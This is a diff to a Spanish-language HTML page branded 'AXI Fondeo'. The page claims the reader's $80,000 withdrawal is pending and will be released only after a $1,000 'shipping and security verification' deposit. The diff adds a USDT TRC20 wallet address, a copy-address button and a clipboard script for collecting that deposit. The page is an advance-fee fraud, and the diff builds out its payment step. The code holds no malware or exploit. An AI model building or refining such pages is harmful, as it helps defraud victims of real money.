@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AXI Fondeo - Proceso de Retiro</title>
+    <title>AXI Fondeo - Proceso de Retiro USDT TRON</title>
     <style>
         * {
             margin: 0;
@@ -152,6 +152,59 @@
             background: #2980b9;
         }
         
+        .payment-details {
+            background: #e8f6f3;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 25px 0;
+            text-align: center;
+        }
+        
+        .payment-details h3 {
+            color: #2c3e50;
+            margin-bottom: 15px;
+        }
+        
+        .qr-code {
+            width: 200px;
+            height: 200px;
+            margin: 15px auto;
+            background: #f8f9fa;
+            padding: 10px;
+            border-radius: 8px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border: 1px solid #ddd;
+            font-weight: bold;
+            color: #555;
+        }
+        
+        .wallet-address {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            word-break: break-all;
+            font-family: monospace;
+            border: 1px dashed #ccc;
+        }
+        
+        .copy-btn {
+            background: #2c3e50;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.3s;
+        }
+        
+        .copy-btn:hover {
+            background: #3498db;
+        }
+        
         @media (max-width: 600px) {
             .content {
                 padding: 20px;
@@ -160,6 +213,11 @@
             .header h1 {
                 font-size: 24px;
             }
+            
+            .qr-code {
+                width: 150px;
+                height: 150px;
+            }
         }
     </style>
 </head>
@@ -167,13 +225,30 @@
     <div class="container">
         <div class="header">
             <h1>AXI FONDEO</h1>
-            <p>Proceso de Retiro de Fondos</p>
+            <p>Proceso de Retiro de Fondos - USDT TRON</p>
         </div>
         
         <div class="content">
             <div class="info-box">
                 <h3>Información Importante</h3>
-                <p>Su solicitud de retiro de $80,000 está pendiente. Para completar el proceso, es necesario realizar un depósito de $1,000 para cubrir los gastos de envío y verificación de seguridad.</p>
+                <p>Su solicitud de retiro de $80,000 está pendiente. Para completar el proceso, es necesario realizar un depósito de $1,000 en USDT (TRC20) para cubrir los gastos de envío y verificación de seguridad.</p>
+            </div>
+            
+            <div class="payment-details">
+                <h3>Depósito USDT (TRON TRC20)</h3>
+                <p>Utilice la siguiente dirección para enviar USDT por la red TRON (TRC20):</p>
+          
+                
+                <div class="wallet-address" id="walletAddress">
+                    TFVuod73zaJBr1bnLHVba46wCqSgWv76AW
+                </div>
+                
+                <button class="copy-btn" onclick="copyAddress()">Copiar dirección</button>
+                
+                <p style="margin-top: 15px; font-size: 14px; color: #555;">
+                    <strong>Importante:</strong> Asegúrese de enviar USDT únicamente por la red TRON (TRC20). 
+                    No envíe otros tokens o por otras redes, ya que podrían perderse.
+                </p>
             </div>
             
             <h2>Proceso de Retiro</h2>
@@ -190,7 +265,7 @@
                     <div class="step-number">2</div>
                     <div class="step-content">
                         <h4>Depósito Requerido</h4>
-                        <p>Para proceder con el retiro, debe depositar $1,000 USD para cubrir gastos de envío y verificación de seguridad.</p>
+                        <p>Para proceder con el retiro, debe depositar $1,000 USD en USDT (TRC20) para cubrir gastos de envío y verificación de seguridad.</p>
                     </div>
                 </div>
                 
@@ -198,7 +273,7 @@
                     <div class="step-number">3</div>
                     <div class="step-content">
                         <h4>Liberación de Fondos</h4>
-                        <p>Una vez confirmado el depósito, liberaremos el capital de $80,000 USD.</p>
+                        <p>Una vez confirmado el depósito (generalmente después de 10-20 confirmaciones de blockchain), liberaremos el capital de $80,000 USD.</p>
                     </div>
                 </div>
                 
@@ -218,7 +293,7 @@
                     <span>$80,000 USD</span>
                 </div>
                 <div class="calculation-item">
-                    <span>Depósito requerido para gastos:</span>
+                    <span>Depósito requerido para gastos (USDT):</span>
                     <span>$1,000 USD</span>
                 </div>
                 <div class="calculation-item">
@@ -238,13 +313,21 @@
             <div class="important-note">
                 <h4>Nota de Seguridad</h4>
                 <p>Este proceso garantiza la seguridad de ambas partes. El depósito inicial nos permite verificar la autenticidad de la transacción y cubrir los gastos operativos. Una vez completado, su retiro será procesado inmediatamente.</p>
+                <p style="margin-top: 10px;"><strong>Nota:</strong> Las transacciones en la red TRON suelen confirmarse en 1-5 minutos. En casos de congestión de red, podría tomar más tiempo.</p>
             </div>
             
-            <div class="contact">
-                <p>¿Tiene preguntas? Contacte a nuestro equipo de soporte</p>
-                <a href="#" class="button">Proceder con el Depósito</a>
-            </div>
         </div>
     </div>
+
+    <script>
+        function copyAddress() {
+            const address = document.getElementById('walletAddress').textContent;
+            navigator.clipboard.writeText(address).then(() => {
+                alert('Dirección copiada al portapapeles: ' + address);
+            }).catch(err => {
+                console.error('Error al copiar: ', err);
+            });
+        }
+    </script>
 </body>
 </html>
